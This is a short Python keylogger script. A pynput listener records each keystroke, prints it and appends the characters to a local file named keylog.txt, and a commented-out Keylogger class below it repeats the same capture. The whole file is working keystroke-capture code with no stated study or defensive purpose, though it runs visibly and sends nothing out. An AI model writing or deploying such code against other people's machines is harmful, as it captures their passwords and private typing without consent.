from pynput import keyboard

def key_pressed(key):
  print(str(key))
  # Here you can add code to log the key press event to a file or database
  with open("keylog.txt", "a") as f:
      try:
          char = key.char
          f.write(char)
      except AttributeError:
          print("Error getting char!")
  
    
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    input("Press Enter to stop...\n")

# import threading

# class Keylogger:
#     def __init__(self):
#         self.log = ""
#         self.listener = pynput.keyboard.Listener(on_press=self.on_key_press)

#     def on_key_press(self, key):
#         try:
#             self.log += key.char
#         except AttributeError:
#             self.log += " " + str(key) + " "

#     def start(self):
#         self.listener.start()
#         self.listener.join()

#     def stop(self):
#         self.listener.stop()
#     def get_log(self):
#         with open("keylog.txt", "a") as f:
#             f.write(self.log)
#         return self.log

